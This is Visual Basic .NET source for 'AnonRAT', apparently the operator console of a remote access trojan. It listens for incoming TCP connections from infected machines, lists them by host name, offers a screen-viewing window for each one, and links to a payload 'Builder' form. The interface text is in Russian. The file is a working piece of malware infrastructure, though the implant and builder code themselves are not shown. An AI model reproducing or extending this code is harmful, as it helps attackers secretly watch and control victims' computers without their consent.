Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.Net.NetworkInformation

Public Class AnonRAT
    Private listener As TcpListener
    Private listeningThread As Thread
    Private monitorThread As Thread
    Private clients As New List(Of TcpClient)

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        flowPanelClients.FlowDirection = FlowDirection.TopDown
    End Sub

    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        Dim ip As String = txtIp.Text
        Dim port As Integer = Convert.ToInt32(txtPort.Text)
        listeningThread = New Thread(Sub() StartListening(ip, port))
        listeningThread.IsBackground = True
        listeningThread.Start()
        monitorThread = New Thread(AddressOf MonitorActiveConnections)
        monitorThread.IsBackground = True
        monitorThread.Start()
        MessageBox.Show("Сервер запущен.")
    End Sub

    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        Try
            If listener IsNot Nothing Then listener.Stop()
            If listeningThread IsNot Nothing AndAlso listeningThread.IsAlive Then listeningThread.Abort()
            If monitorThread IsNot Nothing AndAlso monitorThread.IsAlive Then monitorThread.Abort()
            SyncLock clients
                For Each client In clients
                    client.Close()
                Next
                clients.Clear()
            End SyncLock
            Me.Invoke(Sub() flowPanelClients.Controls.Clear())
            MessageBox.Show("Сервер остановлен.")
        Catch ex As Exception
            MessageBox.Show("Ошибка при остановке сервера: " & ex.Message)
        End Try
    End Sub

    Private Sub StartListening(ip As String, port As Integer)
        Try
            listener = New TcpListener(IPAddress.Any, port)
            listener.Start()
            While True
                Dim client As TcpClient = listener.AcceptTcpClient()
                AddClient(client)
                Dim clientThread As New Thread(Sub() HandleClient(client))
                clientThread.IsBackground = True
                clientThread.Start()
            End While
        Catch ex As Exception
            Me.Invoke(Sub() MessageBox.Show("Ошибка при запуске сервера: " & ex.Message))
        End Try
    End Sub

    Private Sub AddClient(client As TcpClient)
        Dim newPCName As String = GetClientName(client)
        SyncLock clients
            For Each existingClient As TcpClient In clients
                If GetClientName(existingClient) = newPCName Then
                    client.Close()
                    Return
                End If
            Next
            clients.Add(client)
        End SyncLock
        Me.Invoke(Sub()
                      Dim label As New Label()
                      label.Name = "lbl_" & newPCName.Replace(":", "_").Replace(".", "_")
                      label.Text = newPCName
                      label.AutoSize = True
                      label.BackColor = Color.Transparent
                      label.ForeColor = Color.White
                      label.Tag = client
                      Dim cms As New ContextMenuStrip()
                      Dim menuItem As ToolStripItem = cms.Items.Add("Просмотр экрана")
                      AddHandler menuItem.Click, Sub(s, ea)
                                                     Dim viewer As New ScreenViewerForm(CType(label.Tag, TcpClient))
                                                     viewer.Show()
                                                 End Sub
                      label.ContextMenuStrip = cms
                      flowPanelClients.Controls.Add(label)
                  End Sub)
        MessageBox.Show("Новый клиент: " & newPCName)
    End Sub

    Private Sub HandleClient(client As TcpClient)
        Try
            If client Is Nothing OrElse client.Client Is Nothing Then
                Exit Sub
            End If
            While client.Connected
                If Not IsClientConnected(client) Then
                    RemoveClient(client)
                    Exit While
                End If
                Thread.Sleep(100)
            End While
        Catch ex As Exception
            RemoveClient(client)
        End Try
    End Sub

    Private Function IsClientConnected(client As TcpClient) As Boolean
        Try
            If client Is Nothing OrElse client.Client Is Nothing Then Return False
            If client.Client.Poll(0, SelectMode.SelectRead) AndAlso client.Client.Available = 0 Then
                Return False
            End If
            Return True
        Catch
            Return False
        End Try
    End Function

    Private Sub RemoveClient(client As TcpClient)
        If client Is Nothing Then Exit Sub
        SyncLock clients
            If clients.Contains(client) Then clients.Remove(client)
        End SyncLock
        Dim clientName As String = GetClientName(client)
        Me.Invoke(Sub()
                      For Each ctrl As Control In flowPanelClients.Controls
                          If TypeOf ctrl Is Label AndAlso DirectCast(ctrl, Label).Text = clientName Then
                              flowPanelClients.Controls.Remove(ctrl)
                              Exit For
                          End If
                      Next
                  End Sub)
        Try
            client.Close()
        Catch
        End Try
    End Sub

    Private Function GetClientName(client As TcpClient) As String
        If client Is Nothing OrElse client.Client Is Nothing OrElse client.Client.RemoteEndPoint Is Nothing Then
            Return "Unknown"
        End If
        Dim remoteEP As IPEndPoint = TryCast(client.Client.RemoteEndPoint, IPEndPoint)
        Dim remoteIP As String = If(remoteEP IsNot Nothing, remoteEP.Address.ToString(), "Unknown")
        Dim pcName As String = remoteIP
        Try
            Dim hostEntry As IPHostEntry = Dns.GetHostEntry(remoteIP)
            If hostEntry IsNot Nothing AndAlso Not String.IsNullOrEmpty(hostEntry.HostName) Then
                pcName = hostEntry.HostName
            End If
        Catch
        End Try
        Return pcName
    End Function

    Private Sub MonitorActiveConnections()
        While True
            Try
                If listener Is Nothing Then
                    Thread.Sleep(1000)
                    Continue While
                End If
                Dim tcpConnections() As TcpConnectionInformation = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections()
                Dim localIPEndpoint As IPEndPoint = TryCast(listener.LocalEndpoint, IPEndPoint)
                If localIPEndpoint Is Nothing Then
                    Thread.Sleep(1000)
                    Continue While
                End If
                Dim localPort As Integer = localIPEndpoint.Port
                Dim activeRemoteEndpoints As New List(Of String)
                For Each conn In tcpConnections
                    If conn.LocalEndPoint.Port = localPort AndAlso conn.State = TcpState.Established Then
                        activeRemoteEndpoints.Add(conn.RemoteEndPoint.ToString())
                    End If
                Next
                SyncLock clients
                    For Each client In clients.ToArray()
                        If client Is Nothing OrElse client.Client Is Nothing Then Continue For
                        Dim remoteEP As String = client.Client.RemoteEndPoint.ToString()
                        If Not activeRemoteEndpoints.Contains(remoteEP) Then
                            RemoveClient(client)
                        End If
                    Next
                End SyncLock
            Catch
            End Try
            Thread.Sleep(1000)
        End While
    End Sub

    Private Sub aboutBtn_Click(sender As Object, e As EventArgs) Handles aboutBtn.Click
        Dim about As New About()
        about.Show()
    End Sub

    Private Sub builderBtn_Click(sender As Object, e As EventArgs) Handles builderBtn.Click
        Dim builder As New Builder()
        builder.Show()
    End Sub

    Private Sub flowPanelClients_Paint(sender As Object, e As PaintEventArgs) Handles flowPanelClients.Paint

    End Sub
End Class
